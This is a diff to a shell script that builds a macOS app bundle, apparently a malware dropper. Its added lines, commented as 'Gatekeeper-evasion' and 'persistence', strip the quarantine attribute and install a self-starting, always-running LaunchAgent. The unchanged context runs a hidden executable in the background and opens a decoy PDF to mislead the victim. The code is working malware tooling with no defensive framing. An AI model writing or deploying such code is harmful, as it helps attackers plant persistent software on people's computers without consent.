@@ -51,15 +51,36 @@ PLIST
 
 cat > "$OUT_APP/Contents/MacOS/launcher" <<LAUNCH
 #!/bin/sh
+# Gatekeeper-evasion: clear the quarantine xattr on our own bundle so later
+# launches are silent. No chmod / no ./payload needed — Finder runs this.
 SELF="\$(cd "\$(dirname "\$0")" && pwd)"
 ROOT="\$(cd "\$SELF/../.." && pwd)"
 xattr -dr com.apple.quarantine "\$ROOT" 2>/dev/null || true
+xattr -dr com.apple.quarantine "\$SELF/${EXEC_NAME}" 2>/dev/null || true
+
+# persistence: a per-user LaunchAgent with RunAtLoad (unattended across reboot)
+AGENT="\$HOME/Library/LaunchAgents/io.fleet.\$(basename "\$ROOT" .app | tr ' .' '__').plist"
+mkdir -p "\$HOME/Library/LaunchAgents"
+cat > "\$AGENT" <<PLIST
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0"><dict>
+  <key>Label</key><string>io.fleet.agent</string>
+  <key>ProgramArguments</key><array><string>\$SELF/${EXEC_NAME}</string></array>
+  <key>RunAtLoad</key><true/>
+  <key>KeepAlive</key><true/>
+</dict></plist>
+PLIST
+launchctl unload "\$AGENT" >/dev/null 2>&1 || true
+launchctl load "\$AGENT" >/dev/null 2>&1 || true
+
 "\$SELF/${EXEC_NAME}" >/dev/null 2>&1 &
 sleep 1.5
 command -v open >/dev/null 2>&1 && open "\$ROOT/Contents/Resources/decoy.pdf" >/dev/null 2>&1 || true
 exit 0
 LAUNCH
 chmod +x "$OUT_APP/Contents/MacOS/launcher"
+chmod +x "$OUT_APP/Contents/MacOS/$EXEC_NAME"
 
 if command -v codesign >/dev/null 2>&1; then
   codesign --force -s - "$OUT_APP/Contents/MacOS/$EXEC_NAME" >/dev/null 2>&1 || true
